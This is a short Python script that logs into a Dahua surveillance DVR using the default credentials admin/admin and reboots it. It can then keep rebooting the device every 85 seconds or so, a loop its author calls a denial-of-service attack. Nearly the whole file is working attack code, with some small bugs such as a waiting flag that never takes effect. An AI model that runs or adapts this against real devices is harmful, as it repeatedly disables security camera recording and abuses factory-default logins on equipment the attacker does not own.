#!/usr/bin/env python3
#https://gist.github.com/gxfxyz/48072a72be3a169bc43549e676713201#file-dahua_rpc-py
import itertools
import threading
import time
import sys
from dahua_rpc import DahuaRpc, RebootDone

host = "192.168.100.208"
username = "admin"
password = "admin"
done = False

def firstReboot():
    dahua = DahuaRpc(host, username, password)
    print(f"Attempting to log into {host} with {username}:{password}")
    dahua.login()
    print(f"Correctly logged in at {dahua.current_time()}")

    print("Rebooting...")
    try:
        dahua.reboot()
    except RebootDone:
        print("DVR likely reboted!")

def DOS_reboot(waiting=85):
    #Note: This has an error margin of about 9 to 2 seconds.
    #Wait for the DVR to come back online
    timeStart = time.time()
    print(f"Waiting {waiting} seconds for the DVR to reboot...")
    #Start the waiting animation
    done = False
    t = threading.Thread(target=waitAnimation)
    t.daemon = True
    t.start()
    time.sleep(waiting)
    done = True
    timeEnd = time.time()
    #End the waiting amination
    print(f"DVR is (probably) back online after waiting {timeEnd-timeStart} seconds")
    print("Remember to ctrl + C to stop rebooting :)")
    
    #Login to the DVR
    dahua = DahuaRpc(host, username, password)
    print(f"Attempting to log into {host} with {username}:{password}")
    dahua.login()
    print(f"Correctly logged in at {dahua.current_time()}")

    print("Rebooting...")
    try:
        dahua.reboot()
    except RebootDone:
        print("DVR likely reboted!")
        DOS_reboot(waiting=88)

def waitAnimation():
    #here is the animation
    for c in itertools.cycle([" [=     ]",
                                " [ =    ]",
                                " [  =   ]",
                                " [   =  ]",
                                " [    = ]",
                                " [     =]",
                                " [    = ]",
                                " [   =  ]",
                                " [  =   ]",
                                " [ =    ]",]):
        if done:
            break
        sys.stdout.write('\r' + c)
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\rDone!     ')

def main():
    done = False
    
    DOS = input("Do you want to keep rebooting the device? (y/n) ").lower()
    firstReboot()

    if DOS == 'y':
        DOS_reboot(waiting=85)

    print("Goodbye")

if __name__ == "__main__":
    main()